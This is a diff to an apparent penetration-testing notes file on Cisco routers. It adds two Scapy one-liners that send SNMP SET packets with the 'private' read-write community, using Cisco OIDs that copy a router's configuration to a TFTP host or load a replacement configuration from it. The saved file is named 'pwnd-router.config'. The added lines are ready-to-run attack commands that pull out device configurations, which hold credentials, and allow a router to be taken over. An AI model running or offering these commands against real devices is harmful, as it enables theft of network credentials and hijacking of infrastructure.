@@ -40,7 +40,9 @@ https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2009-002/
 http://runplaybook.com/p/11
 
 # download cisco config via snmp rw community
-msf tftp
+pull config: send(IP(src="10.200.0.77", dst="192.168.99.207")/UDP(dport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55.192.168.98.57"),value="pwnd-router.config")])))
+push config: send(IP(src="10.200.0.77", dst="192.168.99.207")/UDP(dport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53.192.168.98.57"),value="pwnd-router.config")])))
+also see msf
 
 # decoding type 7 (vigenere cipher from 16th century)
 cisco# conf t
